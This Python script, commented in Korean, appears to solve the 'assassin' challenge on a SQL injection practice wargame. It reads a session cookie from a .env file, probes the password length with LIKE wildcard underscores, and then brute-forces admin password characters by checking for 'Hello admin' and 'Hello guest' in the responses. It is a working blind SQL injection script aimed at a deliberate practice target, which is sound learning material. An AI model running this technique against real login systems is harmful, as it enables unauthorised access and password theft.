import os
from dotenv import load_dotenv
import requests
from tqdm import tqdm

# 상위 디렉토리의 .env 파일 경로
dotenv_path = os.path.join(os.path.dirname(__file__), '..', '.env')

# .env 파일 로드
load_dotenv(dotenv_path)

# 환경변수 가져오기
my_cookie ={ "PHPSESSID" : os.getenv('MY_COOKIE') }
            

URL = "https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php"
param = "?pw=________"
chars = "0123456789abcdefghijklmnopqrstuvwxyz!@"
len = 0


res = requests.get(URL+param, cookies=my_cookie)
# 길이 구하기
for i in range(1, 100):
    param = "?pw="+"_"*i
    res = requests.get(URL+param, cookies=my_cookie)
    if "Hello guest" in res.text:
        print("length : ", i)
        len = i
        break

# guest랑 겹치는 admin 찾기
ans = ""
guest = ""
admin = ""
flag = 0
for i in range(len):
    print("i :",i)
    flag = 0
    for j in chars:
        param = "?pw="+"_"*i+str(j)+"_"*(len-i-1)
        # print(param)
        res = requests.get(URL+param, cookies=my_cookie)
        
        if "Hello admin" in res.text:
            print("admin :", j)
            admin+= j
            flag = 1
        
        if "Hello guest" in res.text:
            print("guest : ",j)
            guest += j
    if flag == 0:
        admin+="_"

print("admin:",admin)
print("guest:",guest)
  